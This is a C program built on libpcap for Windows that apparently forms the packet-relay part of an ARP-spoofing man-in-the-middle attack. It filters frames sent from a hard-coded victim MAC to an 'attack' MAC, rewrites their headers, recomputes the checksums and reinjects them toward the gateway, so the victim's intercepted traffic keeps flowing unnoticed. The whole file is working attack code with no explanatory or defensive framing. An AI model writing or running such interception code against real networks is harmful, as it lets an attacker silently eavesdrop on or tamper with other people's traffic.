#include <stdio.h>
#include <pcap.h>
#include "ether.h"
#include "chksum.h"
#include "ip.h"
#include <ws2tcpip.h>


#define target_MAC "98:AF:65:72:6D:1B"
#define target_MAC_byte "\x98\xAF\x65\x72\x6D\x1B"
#define gateway_MAC "5a:bb:06:67:4f:f7"
#define gateway_MAC_byte "\x5a\xbb\x06\x67\x4f\xf7"
#define attack_MAC "F0:A6:54:29:6E:5F"
#define attack_MAC_byte "\xF0\xA6\x54\x29\x6E\x5F"
#define attack_ip "192.168.231.224"


void packet_handler(u_char* user, const struct pcap_pkthdr* pkthdr, const u_char* packet) {

	struct ether_header* eth_header = (struct ether_header*)packet;
	struct ip_header* ip_header = (struct ip_header*)(packet + sizeof(struct ether_header));

	const char* target_IP = "192.168.231.166";

	if (memcmp(eth_header->ether_shost, target_MAC_byte, 6) == 0) {
		
		unsigned char* ip_print_ss = (unsigned char*)&ip_header->ip_srcaddr;
		printf("%d.%d.%d.%d  ", ip_print_ss[0], ip_print_ss[1], ip_print_ss[2], ip_print_ss[3]);
		unsigned char* ip_print_ds = (unsigned char*)&ip_header->ip_destaddr;
		printf("%d.%d.%d.%d    ", ip_print_ds[0], ip_print_ds[1], ip_print_ds[2], ip_print_ds[3]);


		memcpy(eth_header->ether_shost, target_MAC_byte, 6);
		InetPton(AF_INET, target_IP, &ip_header->ip_srcaddr);
		memcpy(eth_header->ether_dhost, gateway_MAC_byte, 6);

		ip_header->ip_checksum = 0;
		ip_header->ip_checksum = checksum(ip_header, sizeof(struct ip_header));

		if (ip_header->ip_protocol == IPPROTO_ICMP) {
			struct icmp_header* icmp_header = (struct icmp_header*)(packet + sizeof(struct ether_header) + sizeof(struct ip_header));
			icmp_header->icmp_checksum = 0;
			icmp_header->icmp_checksum = checksum(icmp_header, pkthdr->len - sizeof(struct ether_header) - sizeof(struct ip_header));
		}

		pcap_inject((pcap_t*)user, packet, pkthdr->len);


		unsigned char* ip_print_sd = (unsigned char*)&ip_header->ip_srcaddr;
		printf("%d.%d.%d.%d  ", ip_print_sd[0], ip_print_sd[1], ip_print_sd[2], ip_print_sd[3]);
		unsigned char* ip_print_dd = (unsigned char*)&ip_header->ip_destaddr;
		printf("%d.%d.%d.%d\n", ip_print_dd[0], ip_print_dd[1], ip_print_dd[2], ip_print_dd[3]);
	}
}

int main() {

#define Interface "\\Device\\NPF_{EC9DE579-B5E9-423F-8B4E-2F6CDA22CBA7}"

	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char filter_exp[100];
	struct bpf_program fp;
	bpf_u_int32 net, mask;


	if (pcap_lookupnet(Interface, &net, &mask, errbuf) == -1) {

		fprintf(stderr, "장치 %s의 네트워크 정보를 가져올 수 없습니다: %s\n", Interface, errbuf);

		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(Interface, BUFSIZ, 1, 100, errbuf);
	if (handle == NULL) {

		fprintf(stderr, "Could not open device %s: %s\n", Interface, errbuf);

		return 2;
	}


	snprintf(filter_exp, sizeof(filter_exp), "(ether src %s) && (ether dst %s)", target_MAC, attack_MAC);


	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {

		fprintf(stderr, "filter 문법 error : %s (%s)\n", filter_exp, pcap_geterr(handle));

		return 2;
	}
	if (pcap_setfilter(handle, &fp) == -1) {

		fprintf(stderr, "filter 설정 error : %s (%s)\n", filter_exp, pcap_geterr(handle));

		return 2;
	}

	pcap_loop(handle, 0, packet_handler, (u_char*)handle);

	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;
}